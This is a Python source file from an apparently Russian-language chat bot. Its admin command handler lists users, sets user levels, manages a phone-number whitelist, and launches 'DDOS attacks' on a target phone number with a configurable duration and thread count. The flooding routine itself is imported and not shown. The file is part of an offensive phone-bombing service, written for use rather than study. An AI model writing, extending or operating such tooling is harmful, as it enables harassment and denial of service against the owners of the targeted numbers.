from src import config
from src.api import *
from src.functionality import call_ddos_number, parse_number
from src.levels import Admin_Level as admLvl
from src.sql import SQL


class Admin_Process:
    def __init__(self, sql: SQL):
        self.sql = sql

    def process(self, user_id, message):
        args = message.split()
        if len(args) < 2:
            messages_send(user_id, "Неверно переданы аргументы. Попробуйте снова.")
            return

        # If arg is {list}
        if args[1] == config.admin_command_args[0]:
            users = self.sql.get_rows_from_table('users')
            info = [get_fullname_by_user_id(user[0]) + ' (' + str(user[0]) + ') level: ' + user[1] for user in users]
            messages_send(user_id, '\n'.join(info))

        #If arg is {set_level}
        if args[1] == config.admin_command_args[1]:
            if len(args) == 4:
                isUpdate = self.sql.update_level(args[2], args[3])
                if isUpdate:
                    messages_send(user_id, f"Пользователю {get_fullname_by_user_id(args[2])} (id: {args[2]}) успешно задан level: {args[3]}")
            else:
                messages_send(user_id, "Ошибка: попробуйте указать верное id или level.")

        # If arg is {ddos}
        if args[1] == config.general_command_args["ddos"]:
            time = None
            threads = None
            if len(args) > 2 and len(args) < 6:
                # /admin ddos number time threads
                if len(args) == 5:
                    time = int(args[3])
                    threads = int(args[4])
                    call_ddos_number(user_id, args[2], time, threads)
                # /admin ddos number time
                elif len(args) == 4:
                    time = int(args[3])
                    threads = admLvl.CONFIG["ddos_threads"]
                    call_ddos_number(user_id, args[2], time, threads)
                # /admin ddos number
                else:
                    time = admLvl.CONFIG["ddos_time_limit"]
                    threads = admLvl.CONFIG["ddos_threads"]
                    call_ddos_number(user_id, args[2], time, threads)
                messages_send(user_id, f"DDOS атака на номер {args[2]} успешно запущена!\nВремя атаки: {time} сек.\nКоличество потоков: {threads}.")
            else:
                messages_send(user_id, "Ошибка: неверно заданы аргументы.")

        # If arg is {add_w}
        if args[1] == config.general_command_args["add_w"]: # TODO ошибка при проверке номера в базе
            if len(args) == 3:
                number = parse_number(args[2])
                print(number)
                if not self.sql.is_exists_number(number):
                    self.sql.set_row_to_white_list(number)
                else:
                    messages_send(user_id, f"Ошибка: Номер {args[2]} уже находится в белом списке!")
            else:
                messages_send(user_id, f"Ошибка: Вы не ввели номер телефона!")




